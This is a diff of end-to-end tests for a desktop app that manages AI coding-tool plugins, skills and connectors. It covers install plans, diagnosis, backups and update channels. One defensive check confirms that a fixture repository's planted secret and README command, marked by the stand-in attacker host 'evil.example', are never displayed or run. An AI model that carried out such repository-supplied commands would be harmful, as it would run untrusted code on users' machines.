+    check(T, 'each stale source shows its reason and data date, and offers diagnosis', (await page.locator('[data-source-row="plugins"] [data-data-date]').isVisible()) && (await text(page.locator('[data-source-row="plugins"]'))).includes('آخر نتيجة ناجحة') && (await page.locator('[data-source-row="plugins"] [data-diagnose]').isVisible()));
     check(T, 'no console errors', errors.length === 0, errors.join(' | '));
     await app.close();
   }
@@ -243,128 +341,205 @@ async function main() {
   if (wants('real')) {
     const T = 'REAL';
     const { app, page } = await launch(emptyProfile, { CLAUDE_ADDS_CATALOG_URL: 'https://127.0.0.1:9/marketplace.json', CLAUDE_ADDS_CLAUDE_BIN: join(emptyProfile, 'no-such-claude.exe') });
-    const states = await sourceStates(page);
-    check(T, 'with no cache the catalog is reported as failed', states.catalog === 'failed' && states.cli === 'failed');
+    await page.locator('[data-nav="catalog"]').click();
+    check(T, 'a catalog that never loaded offers diagnosis instead of a bare zero', (await page.locator('[data-state="source-failed"] [data-diagnose="catalog"]').isVisible()));
     await page.locator('[data-nav="mine"]').click();
-    await page.locator('#envbar [data-env="claude-code"]').click();
-    const statuses = await rows(page).evaluateAll((list) => [...new Set(list.map((r) => r.dataset.status))]);
-    check(T, 'nothing is claimed as connected or enabled-by-CLI without the CLI', statuses.length > 0 && !statuses.includes('connected') && !statuses.includes('needs-auth'), statuses.join());
-    check(T, 'file-only plugins read as installed or enabled by settings, connectors as configured', statuses.every((s) => ['installed', 'enabled', 'disabled', 'discovered', 'configured', 'not-configured', 'unverified'].includes(s)), statuses.join());
+    await env(page, 'claude-code').click();
+    const statuses = new Set();
+    for (const kind of ['plugin', 'skill', 'connector']) {
+      await tab(page, kind).click();
+      for (const s of await rows(page).evaluateAll((list) => list.map((r) => r.dataset.status))) statuses.add(s);
+    }
+    check(T, 'nothing is claimed as connected without the CLI', statuses.size > 0 && !statuses.has('connected') && !statuses.has('needs-auth'), [...statuses].join());
     await app.close();
   }
 
-  // ---------- 4. Git link to several destinations, simulated ----------
+  // ---------- 4. A real CLI outside PATH is found and used without touching shell files ----------
+  if (wants('real') && process.platform === 'win32') {
+    const T = 'REAL';
+    const pathKey = Object.keys(process.env).find((key) => key.toLowerCase() === 'path') ?? 'PATH';
+    const hasCodex = (dir) => ['codex.exe', 'codex.cmd', 'codex.bat', 'codex.ps1', 'codex'].some((file) => existsSync(join(dir, file)));
+    const codexDir = (process.env[pathKey] ?? '').split(delimiter).find(hasCodex);
+    if (!codexDir) {
+      check(T, 'CLI path repair (skipped: codex is not on PATH on this machine)', true);
+    } else {
+      // Every PATH folder that holds codex is removed, as when the app is started without the user's shell PATH.
+      const stripped = (process.env[pathKey] ?? '').split(delimiter).filter((dir) => dir && !hasCodex(dir)).join(delimiter);
+      const { app, page, errors } = await launch(join(sandbox, 'path-profile'), { [pathKey]: stripped });
+      await page.locator('[data-nav="platforms"]').click();
+      check(T, 'with Codex off PATH its inventory is reported as broken', (await page.locator('[data-source-row="codex"]').getAttribute('data-source-state')) !== 'ok' && (await page.locator('.platform[data-platform="codex"]').getAttribute('data-platform-state')) === 'needs-fix');
+      await page.locator('.platform[data-platform="codex"] [data-diagnose]').click();
+      await page.waitForSelector('#diag [data-diag="source:codex"]', { timeout: 60000 });
+      check(T, 'diagnosis tells "installed but outside PATH" from "not installed"', (await page.locator('#diag [data-diag="source:codex"]').getAttribute('data-diag-issue')) === 'cli-not-in-path' && (await text(page.locator('#diag [data-diag="source:codex"]'))).includes('خارج PATH'));
+      await page.locator('#diag [data-diag="source:codex"] [data-diag-fix="path"]').click();
+      await page.waitForSelector('#diag [data-diag="source:codex"] [data-diag-result]', { timeout: 240000 });
+      check(T, 'the fix uses the found path inside the app and the re-inventory succeeds', (await page.locator('#diag [data-diag="source:codex"] [data-diag-result]').getAttribute('data-diag-result')) === 'ok' && (await page.locator('#diag [data-diag="source:codex"]').getAttribute('data-diag-issue')) === 'none');
+      await page.screenshot({ path: join(shots, '09-path-repair.png') });
+      await page.locator('#diag [data-diag-close]').click();
+      check(T, 'after the repair the Codex source is healthy and its tools are listed', (await page.locator('[data-source-row="codex"]').getAttribute('data-source-state')) === 'ok' && Number(await env(page, 'codex').locator('.count').innerText()) > 0);
+      check(T, 'no console errors', errors.length === 0, errors.join(' | '));
+      await app.close();
+    }
+  }
+
+  // ---------- 5. Git link, background install, repair and sign-in, simulated ----------
   if (wants('sim')) {
     const T = 'SIM';
     const home = join(sandbox, 'sim-home');
     const repo = join(sandbox, 'fixture-repo');
-    mkdirSync(home, { recursive: true });
     mkdirSync(repo, { recursive: true });
     makeFixtureRepo(repo);
     // A file where Gemini's skills folder should be makes that one destination fail.
     mkdirSync(join(home, '.gemini'), { recursive: true });
     writeFileSync(join(home, '.gemini', 'skills'), 'blocker');
+    // A skill in Codex's old folder, which current docs no longer mention.
+    mkdirSync(join(home, '.codex', 'skills', 'old-skill'), { recursive: true });
+    writeFileSync(join(home, '.codex', 'skills', 'old-skill', 'SKILL.md'), '---\nname: old-skill\ndescription: Lives in the old folder.\n---\n');
     const fakeState = join(sandbox, 'fake-claude-state.json');
     const backups = join(sandbox, 'backups');
     mkdirSync(backups, { recursive: true });
-    // Stand-in for the GitHub release list: one official release and one newer development build.
     const releaseList = JSON.stringify([
       { tag_name: 'v99.0.0', prerelease: false, draft: false, html_url: 'https://github.com/sufyanaser/Claude-Adds/releases/tag/v99.0.0', assets: [] },
       { tag_name: 'v99.1.0-dev.3', prerelease: true, draft: false, html_url: 'https://github.com/sufyanaser/Claude-Adds/releases/tag/v99.1.0-dev.3', assets: [] },
     ]);
     const server = createServer((_request, response) => response.end(releaseList));
     await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
+    // A failed check must not keep the script alive through this server.
+    server.unref();
 
     const { app, page, errors } = await launch(join(sandbox, 'sim-profile'), {
-      CLAUDE_ADDS_PICK_DIR: backups,
-      CLAUDE_ADDS_UPDATE_API: `http://127.0.0.1:${server.address().port}/releases`,
       CLAUDE_ADDS_HOME: home,
       CLAUDE_CONFIG_DIR: join(home, '.claude'),
       CLAUDE_ADDS_ALLOW_LOCAL_GIT: '1',
       CLAUDE_ADDS_CLAUDE_BIN: join(root, 'tests', 'e2e', 'fixtures', 'fake-claude.cmd'),
       FAKE_CLAUDE_STATE: fakeState,
+      CLAUDE_ADDS_PICK_DIR: backups,
+      CLAUDE_ADDS_UPDATE_API: `http://127.0.0.1:${server.address().port}/releases`,
     });
 
     await page.locator('#add-tool').click();
     await page.fill('#plan-url', 'http://example.test/repo');
     await page.locator('[data-plan-inspect]').click();
     check(T, 'a non-https link is refused before anything is downloaded', (await page.locator('[data-plan-error]').innerText()).includes('https'));
-
     await page.fill('#plan-url', repo);
     await page.locator('[data-plan-inspect]').click();
     await page.waitForSelector('#plan .plan-item', { timeout: 120000 });
     const items = await page.locator('#plan .plan-item').evaluateAll((list) => list.map((i) => i.dataset.item));
-    check(T, 'repository contents are discovered by type', ['plugin:demo-plugin', 'extension:demo-extension', 'connector:demo-server', 'skill:skills/demo-skill', 'skill:skills/broken'].every((id) => items.includes(id)), items.join(' '));
-    check(T, 'secrets inside the repository config are never shown', !(await page.locator('#plan').innerText()).includes('do-not-show-this'));
+    check(T, 'repository contents are classified by type', ['plugin:demo-plugin', 'plugin:sleepy-plugin', 'extension:demo-extension', 'connector:demo-server', 'skill:skills/demo-skill', 'skill:skills/broken'].every((id) => items.includes(id)), items.join(' '));
+    const planText = await page.locator('#plan').innerText();
+    check(T, 'secrets and README commands from the repository are neither shown nor run', !planText.includes('do-not-show-this') && !planText.includes('evil.example'));
 
     const skill = page.locator('#plan .plan-item[data-item="skill:skills/demo-skill"]');
     const skillDests = await skill.locator('.dest').evaluateAll((list) => Object.fromEntries(list.map((d) => [d.dataset.dest, d.dataset.destState])));
     check(T, 'one skill offers every compatible destination in one plan', skillDests['claude-code'] === 'ready' && skillDests.codex === 'ready' && skillDests.gemini === 'ready' && skillDests.antigravity === 'ready' && skillDests.claude === 'needs-completion' && skillDests.chatgpt === 'unsupported', JSON.stringify(skillDests));
     check(T, 'each destination states its compatibility evidence', (await skill.locator('.dest[data-dest="codex"]').innerText()).includes('.agents/skills'));
-    const broken = await page.locator('#plan .plan-item[data-item="skill:skills/broken"] .dest').evaluateAll((list) => list.every((d) => d.dataset.destState === 'unsupported'));
-    check(T, 'a skill without valid metadata is not offered anywhere', broken);
-    check(T, 'the Gemini extension and MCP server are shown as needing completion, with the command', (await page.locator('#plan .plan-item[data-item="extension:demo-extension"] .dest[data-dest="gemini"]').getAttribute('data-dest-state')) === 'needs-completion' && (await page.locator('#plan .plan-item[data-item="connector:demo-server"] .dest[data-dest="codex"] code').innerText()).startsWith('codex mcp add'));
-    check(T, 'nothing is ticked by default in a multi-item plan', (await page.locator('#plan [data-plan-run]').isDisabled()));
-    await page.screenshot({ path: join(shots, '10-git-plan.png') });
+    check(T, 'a skill without valid metadata is not offered anywhere', await page.locator('#plan .plan-item[data-item="skill:skills/broken"] .dest').evaluateAll((list) => list.every((d) => d.dataset.destState === 'unsupported')));
+    check(T, 'a destination with no direct mechanism shows "complete setup" with the official command', (await text(page.locator('#plan .plan-item[data-item="extension:demo-extension"] .dest[data-dest="gemini"]'))).includes('إكمال الإعداد') && (await page.locator('#plan .plan-item[data-item="connector:demo-server"] .dest[data-dest="codex"] code').innerText()).startsWith('codex mcp add'));
+    check(T, 'nothing is ticked by default in a multi-item plan', await page.locator('#plan [data-plan-run]').isDisabled());
 
-    for (const env of ['claude-code', 'codex', 'gemini', 'antigravity']) await skill.locator(`.dest[data-dest="${env}"] input`).check();
+    for (const id of ['claude-code', 'codex', 'gemini', 'antigravity']) await skill.locator(`.dest[data-dest="${id}"] input`).check();
     await page.locator('#plan .plan-item[data-item="plugin:demo-plugin"] .dest[data-dest="claude-code"] input').check();
-    check(T, 'the run button counts the chosen destinations', (await page.locator('#plan [data-plan-run]').innerText()).includes('(5)'));
+    await page.locator('#plan .plan-item[data-item="plugin:sleepy-plugin"] .dest[data-dest="claude-code"] input').check();
+    check(T, 'the run button counts the chosen destinations', (await page.locator('#plan [data-plan-run]').innerText()).includes('(6)'));
     await page.locator('#plan [data-plan-run]').click();
-    await page.waitForSelector('#plan .plan-result[data-result-env="gemini"]', { timeout: 120000 });
+    await page.waitForSelector('#plan .plan-item[data-item="plugin:demo-plugin"] [data-progress="install"]', { timeout: 60000 });
+    check(T, 'a running install shows its stage and a stage counter', (await text(page.locator('#plan .plan-item[data-item="plugin:demo-plugin"] [data-progress]'))).includes('2 من 4') && (await text(page.locator('#plan .plan-item[data-item="plugin:demo-plugin"] [data-progress]'))).includes('جاري التثبيت'));
+    await page.screenshot({ path: join(shots, '10-install-progress.png') });
+    await page.waitForSelector('#plan .plan-item[data-item="plugin:sleepy-plugin"] .plan-result', { timeout: 180000 });
     const outcome = await skill.locator('.plan-result').evaluateAll((list) => Object.fromEntries(list.map((r) => [r.dataset.resultEnv, r.dataset.result])));
     check(T, 'each destination reports its own result', outcome['claude-code'] === 'verified' && outcome.codex === 'verified' && outcome.antigravity === 'verified' && outcome.gemini === 'failed', JSON.stringify(outcome));
     check(T, 'the skill was copied to each documented folder', existsSync(join(home, '.claude', 'skills', 'demo-skill', 'SKILL.md')) && existsSync(join(home, '.agents', 'skills', 'demo-skill', 'reference.md')) && existsSync(join(home, '.gemini', 'config', 'skills', 'demo-skill', 'SKILL.md')));
-    check(T, 'the plugin install went through the CLI stand-in', readFileSync(fakeState, 'utf8').includes('demo-plugin') && (await page.locator('#plan .plan-item[data-item="plugin:demo-plugin"] .plan-result').getAttribute('data-result')) === 'verified');
-    await page.screenshot({ path: join(shots, '11-git-results.png') });
+    check(T, 'a plugin that arrives switched off is enabled, and success means verified as enabled', (await page.locator('#plan .plan-item[data-item="plugin:sleepy-plugin"] .plan-result').getAttribute('data-result')) === 'verified' && JSON.parse(readFileSync(fakeState, 'utf8')).plugins['sleepy-plugin'] === true);
 
     rmSync(join(home, '.gemini', 'skills'));
     await skill.locator('[data-retry]').click();
     await page.waitForSelector('#plan .plan-item[data-item="skill:skills/demo-skill"] .plan-result[data-result-env="gemini"][data-result="verified"]', { timeout: 60000 });
     check(T, 'the failed destination is retried on its own and succeeds', existsSync(join(home, '.gemini', 'skills', 'demo-skill', 'SKILL.md')));
+    await page.screenshot({ path: join(shots, '11-git-results.png') });
     await page.locator('#plan [data-plan-close]').click();
     await idle(page);
 
-    await page.fill('#search', 'demo');
-    const mineIds = await rows(page).evaluateAll((list) => list.filter((r) => r.dataset.mine === 'true').map((r) => r.querySelector('.name-btn').dataset.tool));
-    check(T, 'installed tools appear in "my tools" after the re-inventory', ['skill:user-skills:demo-skill', 'skill:agents-skills:demo-skill', 'skill:gemini-skills:demo-skill', 'skill:antigravity-skills:demo-skill', 'plugin:demo-plugin'].every((id) => mineIds.includes(id)), mineIds.join(' '));
-    await page.locator('[data-tool="skill:agents-skills:demo-skill"]').click();
-    const placements = await page.locator('#details [data-placement]').evaluateAll((list) => list.map((p) => `${p.dataset.placement}=${p.dataset.placementStatus}`));
-    check(T, 'a skill in the shared folder is shown for both Codex and Gemini as discovered', placements.join() === 'codex=discovered,gemini=discovered', placements.join());
-    check(T, 'same-named copies in other folders are offered as alternatives, each with its own identity', (await page.locator('#details [data-alternative]').count()) >= 1);
+    // One merged record for the identical skill in four platforms.
+    await tab(page, 'skill').click();
+    await page.fill('#search', 'demo-skill');
+    check(T, 'identical copies in four platform folders appear as one tool in "my tools"', (await rows(page).evaluateAll((list) => list.filter((r) => r.dataset.mine === 'true').length)) === 1);
+    await rows(page).first().locator('.name-btn').click();
+    const placed = await page.locator('#details [data-placement]').evaluateAll((list) => list.map((p) => p.dataset.placement).sort());
+    check(T, 'the merged tool shows its state in each platform', placed.join() === 'antigravity,claude-code,codex,gemini', placed.join());
+    await page.locator('#details [data-primary="verify"]').click();
+    await page.waitForSelector('#details [data-outcome]', { timeout: 120000 });
+    check(T, '"check readiness" re-verifies a discovered tool and shows the evidence', (await page.locator('#details [data-outcome]').getAttribute('data-outcome')) === 'ok' && (await page.locator('#details [data-outcome] details').count()) === 1);
 
-    // Backup to a chosen export path.
+    // Auto-fix for a skill in an undocumented folder: scope shown, confirmed, then verified.
+    await page.fill('#search', 'old-skill');
+    await rows(page).first().locator('.name-btn').click();
+    await page.locator('#details [data-primary="fix"]').click();
+    await page.waitForSelector('#diag [data-diag-fix="copy-skill"]', { timeout: 60000 });
+    check(T, 'diagnosis finds a skill in an undocumented folder', (await page.locator('#diag [data-diag]').getAttribute('data-diag-issue')) === 'skill-scope');
+    await page.locator('#diag [data-diag-fix="copy-skill"]').click();
+    check(T, 'a fix that changes something shows its action and scope and waits for confirmation', (await page.locator('#diag [data-diag-confirm]').innerText()).includes('.agents/skills') && !existsSync(join(home, '.agents', 'skills', 'old-skill')));
+    await page.locator('#diag [data-diag-fix="copy-skill"]').click();
+    await page.waitForSelector('#diag [data-diag-result]', { timeout: 120000 });
+    check(T, 'after confirmation the fix runs and the tool is re-checked', (await page.locator('#diag [data-diag-result]').getAttribute('data-diag-result')) === 'ok' && existsSync(join(home, '.agents', 'skills', 'old-skill', 'SKILL.md')));
+    await page.locator('#diag [data-diag-close]').click();
+
+    // Connector sign-in is its own step: wait for auth, then verify.
+    await page.fill('#search', '');
+    await tab(page, 'connector').click();
+    await page.locator('[data-tool="connector:needs-login"]').click();
+    check(T, 'a connector that needs sign-in offers "continue authentication"', await page.locator('#details [data-primary="auth"]').isVisible());
+    await page.locator('#details [data-primary="auth"]').click();
+    await page.waitForSelector('#details [data-outcome]', { timeout: 120000 });
+    check(T, 'after sign-in the connector is re-checked and reported as connected', (await page.locator('#details [data-outcome]').getAttribute('data-outcome')) === 'ok' && (await page.locator('#table-wrap tbody tr:has([data-tool="connector:needs-login"])').getAttribute('data-status')) === 'connected');
+
+    // Direct install from the details, with the plan closed while it runs.
+    await page.locator('[data-nav="catalog"]').click();
+    await tab(page, 'plugin').click();
+    await page.fill('#search', 'legal');
+    await page.locator('[data-tool="plugin:legal"]').click();
+    await page.locator('#details [data-primary="install"]').click();
+    await page.waitForSelector('#plan .plan-item');
+    await page.locator('#plan [data-plan-run]').click();
+    await page.waitForSelector('#plan [data-progress]', { timeout: 60000 });
+    await page.locator('#plan [data-plan-close]').click();
+    check(T, 'the install keeps running after the plan is closed, and the details show its stage', (await page.locator('#plan').isHidden()) && (await page.locator('#details [data-action-zone] [data-progress]').count()) === 1, await text(page.locator('#details [data-action-zone]')));
+    await page.screenshot({ path: join(shots, '12-background-install.png') });
+    await page.locator('#panel-toggle').click();
+    // The stand-in CLI records the install when it finishes; then the app re-inventories.
+    const installedLegal = () => existsSync(fakeState) && Object.entries(JSON.parse(readFileSync(fakeState, 'utf8')).plugins ?? {}).some(([id, enabled]) => id.startsWith('legal') && enabled === true);
+    await until(installedLegal);
+    await page.waitForTimeout(3000);
+    await idle(page);
+    await page.locator('#panel-toggle').click();
+    await page.locator('[data-nav="mine"]').click();
+    await page.fill('#search', 'legal');
+    const legalRow = page.locator('#table-wrap tbody tr:has([data-tool="plugin:legal"])');
+    check(T, 'hiding the panel does not stop the install: the plugin ends up enabled in "my tools"', installedLegal() && (await legalRow.getAttribute('data-status')) === 'enabled' && (await legalRow.getAttribute('data-mine')) === 'true', `${await legalRow.getAttribute('data-status')} mine=${await legalRow.getAttribute('data-mine')}`);
+    await page.locator('[data-tool="plugin:legal"]').click();
+    check(T, 'reopening the details shows the outcome of the background install', (await page.locator('#details [data-outcome]').count()) === 1 && (await page.locator('#details [data-outcome]').getAttribute('data-outcome')) === 'ok', (await text(page.locator('#details [data-action-zone]'))).slice(0, 160));
+
+    // Backup and app update.
     await page.fill('#search', '');
     await page.locator('[data-nav="platforms"]').click();
-    check(T, 'backup cannot run before an export path is chosen', await page.locator('[data-backup-run]').isDisabled());
     await page.locator('[data-backup-choose]').click();
     await page.waitForFunction(() => !document.querySelector('[data-backup-run]')?.disabled);
-    check(T, 'the chosen export path is shown', (await page.locator('[data-backup-dir]').innerText()).includes('backups'));
     await page.locator('[data-backup-run]').click();
     await page.waitForSelector('[data-backup-result]', { timeout: 60000 });
     const folders = readdirSync(backups);
-    const backupRoot = join(backups, folders[0] ?? '');
-    check(T, 'a dated backup folder is written to the export path', (await page.locator('[data-backup-result]').getAttribute('data-backup-result')) === 'ok' && folders.length === 1 && /^Claude-Adds-backup-\d{4}-\d{2}-\d{2}_/.test(folders[0]));
-    const manifest = existsSync(join(backupRoot, 'manifest.json')) ? readFileSync(join(backupRoot, 'manifest.json'), 'utf8') : '';
-    check(T, 'the backup holds the inventory and copies of owned skills', manifest.includes('skill:user-skills:demo-skill') && manifest.includes('plugin:demo-plugin') && existsSync(join(backupRoot, 'skills', 'user-skills', 'demo-skill', 'SKILL.md')) && existsSync(join(backupRoot, 'skills', 'agents-skills', 'demo-skill', 'reference.md')) && existsSync(join(backupRoot, 'README.txt')));
-    check(T, 'the backup contains no credential values', !manifest.includes('do-not-show-this'));
-    await page.screenshot({ path: join(shots, '14-backup.png') });
-
-    // Update check against the stand-in release list.
-    check(T, 'the app shows its version and starts on the stable channel', (await page.locator('#update-channel').inputValue()) === 'stable' && /\d+\.\d+\.\d+/.test(await page.locator('[data-card="update"] .platform-head').innerText()));
-    await page.locator('[data-update-check]').click();
-    await page.waitForSelector('[data-card="update"][data-update-status="available"]', { timeout: 30000 });
-    check(T, 'the stable channel offers the official release, not the development build', (await page.locator('[data-update-text]').innerText()).includes('99.0.0') && !(await page.locator('[data-update-text]').innerText()).includes('dev'));
+    const manifest = folders[0] && existsSync(join(backups, folders[0], 'manifest.json')) ? readFileSync(join(backups, folders[0], 'manifest.json'), 'utf8') : '';
+    check(T, 'a dated backup holds the inventory and owned skills, with no credential values', (await page.locator('[data-backup-result]').getAttribute('data-backup-result')) === 'ok' && manifest.includes('demo-skill') && existsSync(join(backups, folders[0], 'skills', 'user-skills', 'demo-skill', 'SKILL.md')) && !manifest.includes('do-not-show-this'));
+    await page.locator('[data-app-update-check]').click();
+    await page.waitForSelector('[data-app-update="available"]', { timeout: 30000 });
+    check(T, 'the sidebar reports an available app update on the stable channel', (await text(page.locator('[data-app-update]'))).includes('99.0.0') && (await page.locator('[data-app-version]').getAttribute('data-app-channel')) === 'stable');
     await page.selectOption('#update-channel', 'dev');
-    await page.waitForFunction(() => document.querySelector('[data-update-text]')?.textContent?.includes('99.1.0-dev.3'), null, { timeout: 30000 });
-    check(T, 'the development channel follows the newest build', (await page.locator('#update-channel').inputValue()) === 'dev');
-    await page.screenshot({ path: join(shots, '15-update.png') });
+    await page.waitForFunction(() => document.querySelector('[data-app-update]')?.textContent?.includes('99.1.0-dev.3'), null, { timeout: 30000 });
+    check(T, 'switching to the development channel follows the newest build and shows the channel', (await page.locator('[data-app-version]').getAttribute('data-app-channel')) === 'dev');
     server.close();
     check(T, 'no console errors', errors.length === 0, errors.join(' | '));
     await app.close();
   }
 
-  // ---------- 5. Full journey with the real Claude CLI, isolated ----------
+  // ---------- 6. Full journey with the real Claude CLI, isolated ----------
   if (wants('isolated')) {
     const T = 'REAL-ISOLATED';
     const home = join(sandbox, 'iso-home');
@@ -374,37 +549,36 @@ async function main() {
     const realBefore = existsSync(realRegistry) ? readFileSync(realRegistry, 'utf8') : '';
 
     const { app, page, errors } = await launch(join(sandbox, 'iso-profile'), { CLAUDE_ADDS_HOME: home, CLAUDE_CONFIG_DIR: config, CLAUDE_ADDS_CLAUDE_BIN: undefined });
-    await page.locator('#envbar [data-env="claude-code"]').click();
-    check(T, 'isolated Claude Code starts with no plugins', (await rows(page).evaluateAll((list) => list.filter((r) => r.dataset.kind === 'plugin').length)) === 0);
-    await page.locator('#envbar [data-env="all"]').click();
+    await env(page, 'claude-code').click();
+    check(T, 'isolated Claude Code starts with no plugins', (await rowCount(page)) === 0);
+    await env(page, 'all').click();
 
     // Search by task, read what the tool does, then install it.
     await page.fill('#search', 'المهام');
     await page.locator('[data-tool="plugin:productivity"]').click();
-    const details = await page.locator('#details').innerText();
+    const details = await text(page.locator('#details'));
     check(T, 'searching by task finds the tool in the catalog and explains it', details.includes('إدارة المهام') && details.includes('من الكتالوج'));
-    await page.locator('#details [data-install]').click();
+    await page.locator('#details [data-primary="install"]').click();
     await page.waitForSelector('#plan .plan-item');
     const command = await page.locator('#plan .dest[data-dest="claude-code"] code').innerText();
     check(T, 'the plan uses the documented marketplace install for a fresh configuration', command === 'claude plugin install productivity --marketplace anthropics/knowledge-work-plugins --scope user', command);
     await page.locator('#plan [data-plan-run]').click();
     await page.waitForSelector('#plan .plan-result', { timeout: 300000 });
-    const result = await page.locator('#plan .plan-result').getAttribute('data-result');
-    check(T, 'the real Claude CLI installed the plugin and the fresh inventory confirmed it', result === 'verified', (await page.locator('#plan .plan-result').innerText()).replace(/\s+/g, ' ').slice(0, 120));
-    await page.screenshot({ path: join(shots, '12-real-install-result.png') });
+    check(T, 'the real Claude CLI installed the plugin in the background and a fresh inventory confirmed it as enabled', (await page.locator('#plan .plan-result').getAttribute('data-result')) === 'verified', (await text(page.locator('#plan .plan-result'))).slice(0, 110));
+    await page.screenshot({ path: join(shots, '13-real-install-result.png') });
     await page.locator('#plan [data-plan-close]').click();
     await idle(page);
 
     await page.fill('#search', '');
     await page.locator('[data-nav="mine"]').click();
-    await page.locator('#envbar [data-env="claude-code"]').click();
+    await env(page, 'claude-code').click();
     const row = page.locator('#table-wrap tbody tr:has([data-tool="plugin:productivity"])');
     check(T, 'the plugin now appears in "my tools" as enabled', (await row.getAttribute('data-status')) === 'enabled' && (await row.getAttribute('data-mine')) === 'true');
     await page.locator('[data-tool="plugin:productivity"]').click();
     const placement = page.locator('#details [data-placement="claude-code"]');
-    check(T, 'its status comes from the CLI in user scope', (await placement.getAttribute('data-placement-status')) === 'enabled' && (await placement.innerText()).includes('المستخدم') && (await placement.innerText()).includes('claude plugin list'));
-    check(T, 'its skills arrive with it', (await page.locator('#details [data-related]').count()) > 3);
-    await page.screenshot({ path: join(shots, '13-real-install-my-tools.png') });
+    check(T, 'its status is enabled in user scope', (await placement.getAttribute('data-placement-status')) === 'enabled' && (await placement.innerText()).includes('المستخدم'));
+    check(T, 'its skills and connectors arrive with it', (await page.locator('#details [data-related]').count()) > 3);
+    await page.screenshot({ path: join(shots, '14-real-install-my-tools.png') });
 
     const listed = execFileSync('cmd.exe', ['/d', '/s', '/c', 'claude plugin list --json'], { env: { ...process.env, CLAUDE_CONFIG_DIR: config }, encoding: 'utf8' });
     check(T, 'claude plugin list confirms it outside the app', JSON.parse(listed).some((p) => p.id === 'productivity@knowledge-work-plugins' && p.enabled === true && p.scope === 'user'));
